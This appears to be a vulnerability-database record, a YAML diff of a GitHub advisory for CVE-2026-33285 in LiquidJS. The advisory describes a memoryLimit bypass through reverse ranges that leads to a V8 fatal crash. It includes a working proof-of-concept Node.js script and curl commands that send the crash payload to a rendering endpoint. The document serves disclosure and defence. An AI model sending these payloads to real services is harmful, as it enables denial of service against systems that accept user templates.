@@ -1,0 +1,364 @@
+advisory_id: GHSA-9r5m-9576-7f6x
+datasource_id: github_osv/GHSA-9r5m-9576-7f6x
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-9r5m-9576-7f6x/GHSA-9r5m-9576-7f6x.json
+aliases:
+  - CVE-2026-33285
+summary: "LiquidJS: memoryLimit Bypass through Negative Range Values Leads to Process Crash\n\
+  ### Summary\n\nLiquidJS's `memoryLimit` security mechanism can be completely bypassed by using\
+  \ reverse range expressions (e.g., `(100000000..1)`), allowing an attacker to allocate unlimited\
+  \ memory. Combined with a string flattening operation (e.g., `replace` filter), this causes\
+  \ a **V8 Fatal error that crashes the Node.js process**, resulting in complete denial of service\
+  \ from a single HTTP request.\n\n### Details\nWhen LiquidJS evaluates a range token `(low..high)`,\
+  \ it calls `ctx.memoryLimit.use(high - low + 1)` in `src/render/expression.ts:70` to account\
+  \ for memory usage. However, for reverse ranges where `low > high` (e.g., `(100000000..1)`),\
+  \ this computation yields a negative value (`1 - 100000000 + 1 = -99999998`).\n\nThe `Limiter.use()`\
+  \ method in `src/util/limiter.ts:11-14` does not validate that the `count` parameter is non-negative.\
+  \ It simply adds `count` to `this.base`, causing the internal counter to go negative. Once\
+  \ the counter is sufficiently negative, subsequent legitimate memory allocations that would\
+  \ normally exceed the configured `memoryLimit` pass the `base + count <= limit` assertion.\n\
+  \n```typescript\n// src/render/expression.ts:67-72\nfunction * evalRangeToken (token: RangeToken,\
+  \ ctx: Context) {\n  const low: number = yield evalToken(token.lhs, ctx)\n  const high: number\
+  \ = yield evalToken(token.rhs, ctx)\n  ctx.memoryLimit.use(high - low + 1)  // high=1, low=1e8\
+  \ → use(-99999999)\n  return range(+low, +high + 1)\n}\n\n// src/util/limiter.ts:11-14\nuse\
+  \ (count: number) {\n  count = +count || 0\n  assert(this.base + count <= this.limit, this.message)\n\
+  \  this.base += count  // base becomes negative\n}\n```\n\n#### Escalation to Process Crash\
+  \ via Cons-String Flattening\n\nV8 optimizes string concatenation (`append` filter) by creating\
+  \ a cons-string (a linked tree of string fragments) rather than copying data. This means `{%\
+  \ assign s = s | append: s %}` repeated 27 times creates a 134MB logical string that consumes\
+  \ only kilobytes of actual memory.\n\nHowever, when a filter that requires the full string\
+  \ buffer is applied — such as `replace` — V8 must \"flatten\" the cons-string into a contiguous\
+  \ memory buffer. For a 134MB cons-string, this requires allocating ~268MB (UTF-16) in a single\
+  \ operation. This triggers a **V8 C++ level Fatal error** (`Fatal JavaScript invalid size\
+  \ error 134217729`) that:\n\n- **Cannot be caught** by JavaScript `try-catch` or `process.on('uncaughtException')`\n\
+  - **Immediately terminates** the Node.js process (exit code 133 / SIGTRAP)\n- **Crashes the\
+  \ entire service**, not just the attacking connection\n\nThe complete attack chain:\n1. Insert\
+  \ 5 reverse ranges `{% for x in (100000000..1) %}{% endfor %}` → memory budget becomes -500M\n\
+  2. Build a 134MB cons-string via 27 iterations of `{% assign s = s | append: s %}`  → negligible\
+  \ actual memory\n3. Apply `{% assign flat = s | replace: 'A', 'B' %}` → V8 attempts to flatten\
+  \ → **Fatal error → process crash**\n\nThe attacker payload is ~400 bytes. The server process\
+  \ dies instantly. Express error handlers, domain handlers, and uncaughtException handlers\
+  \ are all bypassed.\n\n### PoC\n- LiquidJS <= 10.24.x with `memoryLimit` option enabled\n\
+  - Attacker can control Liquid template source code \n\n\nSave the following as `poc_memorylimit_bypass.js`\
+  \ and run with `node poc_memorylimit_bypass.js`:\n\n```javascript\nconst { Liquid } = require('liquidjs');\n\
+  \n(async () => {\n  const engine = new Liquid({ memoryLimit: 1e8 }); // 100MB limit\n\n  //\
+  \ Step 1 — Baseline: memoryLimit blocks large allocation\n  console.log('=== Step 1: Baseline\
+  \ (should fail) ===');\n  try {\n    const baseline = \"{% assign s = 'A' %}{% for i in (1..27)\
+  \ %}{% assign s = s | append: s %}{% endfor %}{{ s | size }}\";\n    const result = await\
+  \ engine.parseAndRender(baseline);\n    console.log('Result:', result); // Should not reach\
+  \ here\n  } catch (e) {\n    console.log('Blocked:', e.message); // \"memory alloc limit exceeded\"\
+  \n  }\n\n  // Step 2 — Bypass: reverse ranges drive counter negative\n  console.log('\\n===\
+  \ Step 2: Bypass (should succeed) ===');\n  try {\n    const bypass = \"{% for x in (100000000..1)\
+  \ %}{% endfor %}{% for x in (100000000..1) %}{% endfor %}{% assign s = 'A' %}{% for i in (1..27)\
+  \ %}{% assign s = s | append: s %}{% endfor %}{{ s | size }}\";\n    const result = await\
+  \ engine.parseAndRender(bypass);\n    console.log('Result:', result); // \"134217728\" — 134MB\
+  \ allocated despite 100MB limit\n  } catch (e) {\n    console.log('Error:', e.message);\n\
+  \  }\n\n  // Step 3 — Process crash: cons-string flattening via replace\n  console.log('\\\
+  n=== Step 3: Process crash (node process will terminate) ===');\n  console.log('If the process\
+  \ exits here with code 133/SIGTRAP, the crash is confirmed.');\n  try {\n    const crash =\
+  \ [\n      ...Array(5).fill('{% for x in (100000000..1) %}{% endfor %}'),\n      \"{% assign\
+  \ s = 'A' %}{% for i in (1..27) %}{% assign s = s | append: s %}{% endfor %}\",\n      \"\
+  {% assign flat = s | replace: 'A', 'B' %}{{ flat | size }}\"\n    ].join('');\n    const result\
+  \ = await engine.parseAndRender(crash);\n    console.log('Result:', result); // Should not\
+  \ reach here\n  } catch (e) {\n    console.log('Caught error:', e.message); // V8 Fatal error\
+  \ is NOT catchable\n  }\n})();\n```\n\n**Expected output:**\n\n```\n=== Step 1: Baseline (should\
+  \ fail) ===\nBlocked: memory alloc limit exceeded, line:1, col:43\n\n=== Step 2: Bypass (should\
+  \ succeed) ===\nResult: 134217728\n\n=== Step 3: Process crash (node process will terminate)\
+  \ ===\nIf the process exits here with code 133/SIGTRAP, the crash is confirmed.\n#\n# Fatal\
+  \ error in , line 0\n# Fatal JavaScript invalid size error 134217729\n#\n```\n\nThe process\
+  \ terminates at Step 3 with exit code 133 (SIGTRAP). The V8 Fatal error occurs at the C++\
+  \ level and **cannot be caught** by `try-catch`, `process.on('uncaughtException')`, or any\
+  \ JavaScript error handler.\n\n#### HTTP Reproduction (for applications that accept user templates)\n\
+  \nIf the application exposes an endpoint that renders user-supplied Liquid templates with\
+  \ `memoryLimit` configured (e.g., CMS preview, newsletter editor, etc.):\n\n```bash\n# Step\
+  \ 1 — Baseline: should return \"memory alloc limit exceeded\"\ncurl -s -X POST http://<app>/render\
+  \ \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"template\": \"{% assign s = '\\\
+  ''A'\\'' %}{% for i in (1..27) %}{% assign s = s | append: s %}{% endfor %}{{ s | size }}\"\
+  }'\n\n# Step 2 — Bypass: should return \"134217728\" (134MB allocated despite 100MB limit)\n\
+  curl -s -X POST http://<app>/render \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"\
+  template\": \"{% for x in (100000000..1) %}{% endfor %}{% for x in (100000000..1) %}{% endfor\
+  \ %}{% assign s = '\\''A'\\'' %}{% for i in (1..27) %}{% assign s = s | append: s %}{% endfor\
+  \ %}{{ s | size }}\"}'\n\n# Step 3 — Process crash: connection drops, server process terminates\n\
+  curl -s -X POST http://<app>/render \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"\
+  template\": \"{% for x in (100000000..1) %}{% endfor %}{% for x in (100000000..1) %}{% endfor\
+  \ %}{% for x in (100000000..1) %}{% endfor %}{% for x in (100000000..1) %}{% endfor %}{% for\
+  \ x in (100000000..1) %}{% endfor %}{% assign s = '\\''A'\\'' %}{% for i in (1..27) %}{% assign\
+  \ s = s | append: s %}{% endfor %}{% assign flat = s | replace: '\\''A'\\'', '\\''B'\\'' %}{{\
+  \ flat | size }}\"}'\n```\n\nReplace `http://<app>/render` with the actual template rendering\
+  \ endpoint. The payload is pure Liquid syntax and works regardless of the HTTP framework or\
+  \ endpoint structure.\n\n### Impact\nAn attacker who can control template content (common\
+  \ in CMS, email template editors, and SaaS platforms using LiquidJS) can bypass the `memoryLimit`\
+  \ protection entirely and crash the Node.js process:\n\n- **Complete bypass of the `memoryLimit`\
+  \ security mechanism**: The explicitly configured memory limit becomes ineffective.\n- **Process\
+  \ crash from a single HTTP request**: V8 Fatal error terminates the entire Node.js process,\
+  \ not just the attacking request. This is not a catchable JavaScript exception.\n- **Service-wide\
+  \ denial of service**: All in-flight requests are terminated. Manual restart or container\
+  \ restart policy is required to recover.\n- **False sense of security**: Administrators who\
+  \ configured `memoryLimit` believe their service is protected when it is not.\n- **Container\
+  \ restart policy does not mitigate**: Even with Docker `restart: always` or Kubernetes liveness\
+  \ probes, repeated crash payloads can keep the service in a perpetual restart loop. Each restart\
+  \ takes several seconds, during which all in-flight requests are lost and the service is unavailable."
+impacted_packages:
+  - purl: pkg:npm/liquidjs
+    affected_versions: vers:npm/<=10.24.0
+    fixed_versions:
+    affected_packages:
+      - pkg:npm/liquidjs@1.9.1
+      - pkg:npm/liquidjs@1.9.2
+      - pkg:npm/liquidjs@1.9.3
+      - pkg:npm/liquidjs@1.9.4
+      - pkg:npm/liquidjs@1.9.5
+      - pkg:npm/liquidjs@1.9.6
+      - pkg:npm/liquidjs@1.9.7
+      - pkg:npm/liquidjs@2.0.0
+      - pkg:npm/liquidjs@2.0.1
+      - pkg:npm/liquidjs@2.0.2
+      - pkg:npm/liquidjs@2.0.3
+      - pkg:npm/liquidjs@2.1.0
+      - pkg:npm/liquidjs@2.1.1
+      - pkg:npm/liquidjs@2.1.2
+      - pkg:npm/liquidjs@2.1.3
+      - pkg:npm/liquidjs@2.1.4
+      - pkg:npm/liquidjs@2.2.0
+      - pkg:npm/liquidjs@2.2.1
+      - pkg:npm/liquidjs@3.0.0
+      - pkg:npm/liquidjs@3.1.0
+      - pkg:npm/liquidjs@3.1.1
+      - pkg:npm/liquidjs@3.1.2
+      - pkg:npm/liquidjs@3.1.3
+      - pkg:npm/liquidjs@4.0.0
+      - pkg:npm/liquidjs@5.0.0
+      - pkg:npm/liquidjs@5.0.1
+      - pkg:npm/liquidjs@5.0.2
+      - pkg:npm/liquidjs@5.1.0
+      - pkg:npm/liquidjs@5.1.1
+      - pkg:npm/liquidjs@5.2.0
+      - pkg:npm/liquidjs@5.3.0-0
+      - pkg:npm/liquidjs@6.0.0
+      - pkg:npm/liquidjs@6.0.1
+      - pkg:npm/liquidjs@6.1.0
+      - pkg:npm/liquidjs@6.1.1
+      - pkg:npm/liquidjs@6.2.0
+      - pkg:npm/liquidjs@6.2.1
+      - pkg:npm/liquidjs@6.3.0
+      - pkg:npm/liquidjs@6.4.0
+      - pkg:npm/liquidjs@6.4.1
+      - pkg:npm/liquidjs@6.4.2
+      - pkg:npm/liquidjs@6.4.3
+      - pkg:npm/liquidjs@7.0.0
+      - pkg:npm/liquidjs@7.0.1
+      - pkg:npm/liquidjs@7.0.2
+      - pkg:npm/liquidjs@7.1.0
+      - pkg:npm/liquidjs@7.2.0
+      - pkg:npm/liquidjs@7.2.1
+      - pkg:npm/liquidjs@7.2.2
+      - pkg:npm/liquidjs@7.3.0
+      - pkg:npm/liquidjs@7.3.1
+      - pkg:npm/liquidjs@7.4.0
+      - pkg:npm/liquidjs@7.5.0
+      - pkg:npm/liquidjs@7.5.1
+      - pkg:npm/liquidjs@8.0.0
+      - pkg:npm/liquidjs@8.0.1
+      - pkg:npm/liquidjs@8.0.2
+      - pkg:npm/liquidjs@8.0.3
+      - pkg:npm/liquidjs@8.1.0
+      - pkg:npm/liquidjs@8.2.0
+      - pkg:npm/liquidjs@8.2.1
+      - pkg:npm/liquidjs@8.2.2
+      - pkg:npm/liquidjs@8.2.3
+      - pkg:npm/liquidjs@8.2.4
+      - pkg:npm/liquidjs@8.3.0
+      - pkg:npm/liquidjs@8.4.0
+      - pkg:npm/liquidjs@8.4.1
+      - pkg:npm/liquidjs@8.5.0
+      - pkg:npm/liquidjs@8.5.1
+      - pkg:npm/liquidjs@8.5.2
+      - pkg:npm/liquidjs@8.5.3
+      - pkg:npm/liquidjs@9.0.0
+      - pkg:npm/liquidjs@9.0.1
+      - pkg:npm/liquidjs@9.1.0
+      - pkg:npm/liquidjs@9.1.1
+      - pkg:npm/liquidjs@9.2.0
+      - pkg:npm/liquidjs@9.3.0
+      - pkg:npm/liquidjs@9.3.1
+      - pkg:npm/liquidjs@9.4.0
+      - pkg:npm/liquidjs@9.4.1
+      - pkg:npm/liquidjs@9.4.2
+      - pkg:npm/liquidjs@9.5.0
+      - pkg:npm/liquidjs@9.6.0
+      - pkg:npm/liquidjs@9.6.1
+      - pkg:npm/liquidjs@9.6.2
+      - pkg:npm/liquidjs@9.7.0
+      - pkg:npm/liquidjs@9.7.1
+      - pkg:npm/liquidjs@9.7.2
+      - pkg:npm/liquidjs@9.8.0
+      - pkg:npm/liquidjs@9.9.0
+      - pkg:npm/liquidjs@9.10.0
+      - pkg:npm/liquidjs@9.11.0
+      - pkg:npm/liquidjs@9.11.1
+      - pkg:npm/liquidjs@9.11.2
+      - pkg:npm/liquidjs@9.11.3
+      - pkg:npm/liquidjs@9.11.4
+      - pkg:npm/liquidjs@9.11.5
+      - pkg:npm/liquidjs@9.11.6
+      - pkg:npm/liquidjs@9.11.7
+      - pkg:npm/liquidjs@9.11.8
+      - pkg:npm/liquidjs@9.11.9
+      - pkg:npm/liquidjs@9.11.10
+      - pkg:npm/liquidjs@9.11.11
+      - pkg:npm/liquidjs@9.12.0
+      - pkg:npm/liquidjs@9.13.0
+      - pkg:npm/liquidjs@9.14.0
+      - pkg:npm/liquidjs@9.14.1
+      - pkg:npm/liquidjs@9.15.0
+      - pkg:npm/liquidjs@9.15.1
+      - pkg:npm/liquidjs@9.16.0
+      - pkg:npm/liquidjs@9.16.1
+      - pkg:npm/liquidjs@9.17.0
+      - pkg:npm/liquidjs@9.18.0
+      - pkg:npm/liquidjs@9.19.0
+      - pkg:npm/liquidjs@9.20.0
+      - pkg:npm/liquidjs@9.20.1
+      - pkg:npm/liquidjs@9.21.0
+      - pkg:npm/liquidjs@9.22.0
+      - pkg:npm/liquidjs@9.22.1
+      - pkg:npm/liquidjs@9.23.0
+      - pkg:npm/liquidjs@9.23.1
+      - pkg:npm/liquidjs@9.23.2
+      - pkg:npm/liquidjs@9.23.3
+      - pkg:npm/liquidjs@9.23.4
+      - pkg:npm/liquidjs@9.24.0
+      - pkg:npm/liquidjs@9.24.1
+      - pkg:npm/liquidjs@9.24.2
+      - pkg:npm/liquidjs@9.25.0
+      - pkg:npm/liquidjs@9.25.1
+      - pkg:npm/liquidjs@9.26.0
+      - pkg:npm/liquidjs@9.27.0
+      - pkg:npm/liquidjs@9.27.1
+      - pkg:npm/liquidjs@9.28.0
+      - pkg:npm/liquidjs@9.28.1
+      - pkg:npm/liquidjs@9.28.2
+      - pkg:npm/liquidjs@9.28.3
+      - pkg:npm/liquidjs@9.28.4
+      - pkg:npm/liquidjs@9.28.5
+      - pkg:npm/liquidjs@9.28.6
+      - pkg:npm/liquidjs@9.29.0
+      - pkg:npm/liquidjs@9.30.0
+      - pkg:npm/liquidjs@9.31.0
+      - pkg:npm/liquidjs@9.32.0
+      - pkg:npm/liquidjs@9.32.1
+      - pkg:npm/liquidjs@9.33.0
+      - pkg:npm/liquidjs@9.33.1
+      - pkg:npm/liquidjs@9.34.0
+      - pkg:npm/liquidjs@9.34.1
+      - pkg:npm/liquidjs@9.35.0
+      - pkg:npm/liquidjs@9.35.1
+      - pkg:npm/liquidjs@9.35.2
+      - pkg:npm/liquidjs@9.36.0
+      - pkg:npm/liquidjs@9.36.1
+      - pkg:npm/liquidjs@9.36.2
+      - pkg:npm/liquidjs@9.37.0
+      - pkg:npm/liquidjs@9.38.0
+      - pkg:npm/liquidjs@9.39.0
+      - pkg:npm/liquidjs@9.39.1
+      - pkg:npm/liquidjs@9.39.2
+      - pkg:npm/liquidjs@9.40.0
+      - pkg:npm/liquidjs@9.41.0
+      - pkg:npm/liquidjs@9.42.0
+      - pkg:npm/liquidjs@9.42.1
+      - pkg:npm/liquidjs@9.43.0
+      - pkg:npm/liquidjs@10.0.0
+      - pkg:npm/liquidjs@10.1.0
+      - pkg:npm/liquidjs@10.2.0
+      - pkg:npm/liquidjs@10.3.0
+      - pkg:npm/liquidjs@10.3.1
+      - pkg:npm/liquidjs@10.3.2
+      - pkg:npm/liquidjs@10.3.3
+      - pkg:npm/liquidjs@10.4.0
+      - pkg:npm/liquidjs@10.5.0
+      - pkg:npm/liquidjs@10.6.0
+      - pkg:npm/liquidjs@10.6.1
+      - pkg:npm/liquidjs@10.6.2
+      - pkg:npm/liquidjs@10.7.0
+      - pkg:npm/liquidjs@10.7.1
+      - pkg:npm/liquidjs@10.8.0
+      - pkg:npm/liquidjs@10.8.1
+      - pkg:npm/liquidjs@10.8.2
+      - pkg:npm/liquidjs@10.8.3
+      - pkg:npm/liquidjs@10.8.4
+      - pkg:npm/liquidjs@10.9.0
+      - pkg:npm/liquidjs@10.9.1
+      - pkg:npm/liquidjs@10.9.2
+      - pkg:npm/liquidjs@10.9.3
+      - pkg:npm/liquidjs@10.9.4
+      - pkg:npm/liquidjs@10.10.0
+      - pkg:npm/liquidjs@10.10.1
+      - pkg:npm/liquidjs@10.10.2
+      - pkg:npm/liquidjs@10.11.0
+      - pkg:npm/liquidjs@10.11.1
+      - pkg:npm/liquidjs@10.12.0
+      - pkg:npm/liquidjs@10.13.0
+      - pkg:npm/liquidjs@10.13.1
+      - pkg:npm/liquidjs@10.14.0
+      - pkg:npm/liquidjs@10.15.0
+      - pkg:npm/liquidjs@10.16.0
+      - pkg:npm/liquidjs@10.16.1
+      - pkg:npm/liquidjs@10.16.2
+      - pkg:npm/liquidjs@10.16.3
+      - pkg:npm/liquidjs@10.16.4
+      - pkg:npm/liquidjs@10.16.5
+      - pkg:npm/liquidjs@10.16.6
+      - pkg:npm/liquidjs@10.16.7
+      - pkg:npm/liquidjs@10.17.0
+      - pkg:npm/liquidjs@10.18.0
+      - pkg:npm/liquidjs@10.19.0
+      - pkg:npm/liquidjs@10.19.1
+      - pkg:npm/liquidjs@10.20.0
+      - pkg:npm/liquidjs@10.20.1
+      - pkg:npm/liquidjs@10.20.2
+      - pkg:npm/liquidjs@10.20.3
+      - pkg:npm/liquidjs@10.21.0
+      - pkg:npm/liquidjs@10.21.1
+      - pkg:npm/liquidjs@10.22.0
+      - pkg:npm/liquidjs@10.23.0
+      - pkg:npm/liquidjs@10.24.0
+    fixed_packages: []
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/harttle/liquidjs
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/harttle/liquidjs
+        commit: 95ddefc056a11a44d9e753fd47a39db2c241e578
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-9r5m-9576-7f6x/GHSA-9r5m-9576-7f6x.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-400
+  - CWE-20
+references:
+  - url: https://github.com/harttle/liquidjs
+    reference_type:
+    reference_id:
+  - url: https://github.com/harttle/liquidjs/commit/95ddefc056a11a44d9e753fd47a39db2c241e578
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-33285
+    reference_type:
+    reference_id: CVE-2026-33285
+  - url: https://github.com/harttle/liquidjs/security/advisories/GHSA-9r5m-9576-7f6x
+    reference_type:
+    reference_id: GHSA-9r5m-9576-7f6x
+exploits: []
